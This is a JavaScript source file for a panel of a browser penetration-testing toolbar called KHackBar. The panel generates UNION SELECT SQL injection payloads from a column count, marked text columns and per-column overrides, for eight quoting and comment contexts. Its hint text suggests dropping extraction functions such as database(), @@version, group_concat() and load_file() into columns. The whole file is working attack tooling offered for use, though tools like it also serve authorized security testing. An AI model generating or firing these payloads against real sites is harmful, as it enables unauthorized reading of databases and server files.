// ============================================================
// union.js - UNION SELECT column-count-aware payload generator
// ============================================================
// A UNION-based injection only works if the injected SELECT has exactly
// as many columns as the original query, and each column's value has to
// be a type the database will accept there (a bare number won't satisfy
// a text column on strict engines like PostgreSQL). Rather than a fixed
// list of "1,2,3" / "1,2,3,4" style payloads, this panel asks for the
// column count up front and lets you mark which positions should be
// string literals instead of numbers, then generates ready payloads for
// the common injection contexts (numeric parameter, quoted string,
// quote+paren, etc).

window.KHackBar = window.KHackBar || {};
window.KHackBar.Union = window.KHackBar.Union || {};

/**
 * Render the UNION SELECT generator panel.
 * @param {HTMLElement} panel - The union_panel container element
 * @param {HTMLElement} urlBox - The URL textarea element
 */
window.KHackBar.Union.render = function (panel, urlBox) {
  if (!panel || !urlBox) return;
  if (!window.KHackBar.UI) return;

  while (panel.firstChild) panel.removeChild(panel.firstChild);
  panel.style.flexDirection = 'column';

  // ---- Form: column count / text columns / text value / Generate ----
  var form = document.createElement('div');
  form.style.width = '100%';
  form.style.display = 'flex';
  form.style.flexWrap = 'wrap';
  form.style.gap = '8px';
  form.style.marginBottom = '8px';
  form.style.alignItems = 'flex-end';

  function makeField(labelText, inputEl) {
    var wrap = document.createElement('div');
    wrap.style.display = 'flex';
    wrap.style.flexDirection = 'column';
    wrap.style.gap = '2px';
    var label = document.createElement('div');
    label.style.fontSize = '10px';
    label.style.color = '#ef4444';
    label.textContent = labelText;
    wrap.appendChild(label);
    wrap.appendChild(inputEl);
    return wrap;
  }

  var colCountInput = document.createElement('input');
  colCountInput.type = 'number';
  colCountInput.min = '1';
  colCountInput.max = '40';
  colCountInput.value = '3';
  colCountInput.style.width = '60px';
  colCountInput.className = 'settings-input';

  var textColsInput = document.createElement('input');
  textColsInput.type = 'text';
  textColsInput.placeholder = 'e.g. 2,4 (blank = all numbers)';
  textColsInput.style.width = '170px';
  textColsInput.className = 'settings-input';

  var textValueInput = document.createElement('input');
  textValueInput.type = 'text';
  textValueInput.value = 'text';
  textValueInput.style.width = '80px';
  textValueInput.className = 'settings-input';

  var overridesInput = document.createElement('input');
  overridesInput.type = 'text';
  overridesInput.placeholder = 'e.g. 2:database(),3:@@version';
  overridesInput.style.width = '220px';
  overridesInput.className = 'settings-input';

  var generateBtn = document.createElement('button');
  generateBtn.className = 'action-btn';
  generateBtn.style.fontSize = '11px';
  generateBtn.textContent = 'Generate';

  form.appendChild(makeField('How many columns?', colCountInput));
  form.appendChild(makeField('Text columns (positions)', textColsInput));
  form.appendChild(makeField('Text value', textValueInput));
  form.appendChild(makeField('Column overrides (pos:value)', overridesInput));
  form.appendChild(generateBtn);
  panel.appendChild(form);

  var hint = document.createElement('div');
  hint.style.width = '100%';
  hint.style.fontSize = '10px';
  hint.style.color = '#a3a3a3';
  hint.style.marginBottom = '8px';
  hint.textContent = 'Find the column count first (e.g. with an ORDER BY probe), enter it above, mark any text/string column positions, then click a generated payload below to insert it. Use "Column overrides" to drop a raw extraction function (database(), @@version, group_concat(...), load_file(...), etc.) into a specific column instead of a number.';
  panel.appendChild(hint);

  var resultsRow = document.createElement('div');
  resultsRow.style.display = 'flex';
  resultsRow.style.flexWrap = 'wrap';
  resultsRow.style.gap = '4px';
  resultsRow.style.width = '100%';
  panel.appendChild(resultsRow);

  function parsePositions(str) {
    return str.split(',')
      .map(function (s) { return parseInt(s.trim(), 10); })
      .filter(function (n) { return !isNaN(n) && n > 0; });
  }

  // Parses "2:database(),3:@@version" into { 2: 'database()', 3: '@@version' }.
  // Overrides win over both the numeric default and the text-column marking,
  // since they're an explicit "put exactly this in column N" instruction.
  function parseOverrides(str) {
    var map = {};
    str.split(',').forEach(function (pair) {
      var idx = pair.indexOf(':');
      if (idx === -1) return;
      var pos = parseInt(pair.substring(0, idx).trim(), 10);
      var value = pair.substring(idx + 1).trim();
      if (!isNaN(pos) && pos > 0 && value) map[pos] = value;
    });
    return map;
  }

  function buildColumnList(count, textPositions, textValue, overrides) {
    var cols = [];
    for (var i = 1; i <= count; i++) {
      if (overrides[i] !== undefined) {
        cols.push(overrides[i]);
      } else if (textPositions.indexOf(i) !== -1) {
        cols.push("'" + textValue + "'");
      } else {
        cols.push(String(i));
      }
    }
    return cols.join(',');
  }

  // Common injection contexts the UNION might be landing in.
  var variants = [
    { label: '-1 UNION SELECT ...-- -',   prefix: '-1 ',   suffix: '-- -' },
    { label: 'NULL UNION SELECT ...-- -', prefix: 'NULL ', suffix: '-- -' },
    { label: "' UNION SELECT ...-- -",    prefix: "' ",    suffix: '-- -' },
    { label: '" UNION SELECT ...-- -',    prefix: '" ',    suffix: '-- -' },
    { label: "') UNION SELECT ...-- -",   prefix: "') ",   suffix: '-- -' },
    { label: '") UNION SELECT ...-- -',   prefix: '") ',   suffix: '-- -' },
    { label: "')) UNION SELECT ...-- -",  prefix: "')) ",  suffix: '-- -' },
    { label: "' UNION SELECT ...#",       prefix: "' ",    suffix: '#' }
  ];

  function regenerate() {
    while (resultsRow.firstChild) resultsRow.removeChild(resultsRow.firstChild);

    var count = parseInt(colCountInput.value, 10);
    if (isNaN(count) || count < 1) count = 1;
    var textPositions = parsePositions(textColsInput.value);
    var textValue = textValueInput.value || 'text';
    var overrides = parseOverrides(overridesInput.value);
    var columnList = buildColumnList(count, textPositions, textValue, overrides);

    variants.forEach(function (v) {
      var payload = v.prefix + 'UNION SELECT ' + columnList + v.suffix;
      var btn = window.KHackBar.UI.createPayloadButton(v.label, payload, 'union_panel', urlBox);
      resultsRow.appendChild(btn);
    });
  }

  generateBtn.onclick = regenerate;
  // Build once immediately with the defaults so the panel is useful the
  // moment it's opened, without requiring an extra click.
  regenerate();
};
